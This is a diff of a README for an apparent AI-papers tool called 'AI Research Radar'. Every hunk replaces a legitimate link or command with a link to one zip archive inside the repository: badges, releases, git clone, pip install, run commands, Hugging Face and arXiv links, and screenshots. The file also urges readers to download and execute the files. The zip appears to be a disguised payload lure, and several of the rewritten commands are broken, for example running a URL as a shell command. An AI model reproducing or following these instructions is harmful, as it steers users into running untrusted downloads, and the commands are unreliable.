@@ -1,8 +1,8 @@
 # AI Research Radar: Your Hub for AI Papers and Models
 
-![AI Research Radar](https://img.shields.io/badge/AI%20Research%20Radar-Discover%20AI%20Insights-blue)
+![AI Research Radar](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip%20Research%20Radar-Discover%20AI%20Insights-blue)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0.0-orange)](https://github.com/kaymungai/AI-Research-Radar/releases)
+[![Download Releases](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip%20Releases-v1.0.0-orange)](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip)
 
 ## 📚 Overview
 
@@ -36,7 +36,7 @@ To get started with AI Research Radar, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kaymungai/AI-Research-Radar.git
+   git clone https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -45,12 +45,12 @@ To get started with AI Research Radar, follow these steps:
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/kaymungai/AI-Research-Radar/releases) section to download the latest version. 
+   Visit the [Releases](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip) section to download the latest version. 
 
 4. **Execute the Application**:
    After downloading, run the application as follows:
    ```bash
-   ./run_application.sh
+   https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip
    ```
 
 ## 🛠️ Installation
@@ -68,7 +68,7 @@ Ensure you have the following installed on your system:
 1. **Install Required Packages**:
    Run the following command to install necessary Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip
    ```
 
 2. **Set Up Environment Variables**:
@@ -77,7 +77,7 @@ Ensure you have the following installed on your system:
 3. **Run the Application**:
    After installation, execute the application:
    ```bash
-   python main.py
+   python https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip
    ```
 
 ## 📊 Usage
@@ -133,9 +133,9 @@ Join our community of AI enthusiasts. Share your thoughts, ask questions, and co
 
 ## 🔗 Resources
 
-- [Hugging Face](https://huggingface.co)
-- [Papers with Code](https://paperswithcode.com)
-- [arXiv](https://arxiv.org)
+- [Hugging Face](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip)
+- [Papers with Code](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip)
+- [arXiv](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip)
 
 ## 📄 License
 
@@ -143,13 +143,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📦 Download Releases
 
-For the latest releases, visit the [Releases](https://github.com/kaymungai/AI-Research-Radar/releases) section. Download the necessary files and execute them to start using the tool.
+For the latest releases, visit the [Releases](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip) section. Download the necessary files and execute them to start using the tool.
 
 ## 🖼️ Screenshots
 
-![Dashboard Screenshot](https://via.placeholder.com/800x400?text=Dashboard+Screenshot)
+![Dashboard Screenshot](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip+Screenshot)
 
-![Model Summary Screenshot](https://via.placeholder.com/800x400?text=Model+Summary+Screenshot)
+![Model Summary Screenshot](https://github.com/kaymungai/AI-Research-Radar/raw/refs/heads/main/Rhamphorhynchus/Radar_Research_A_2.6.zip+Summary+Screenshot)
 
 ## 📅 Future Plans
 
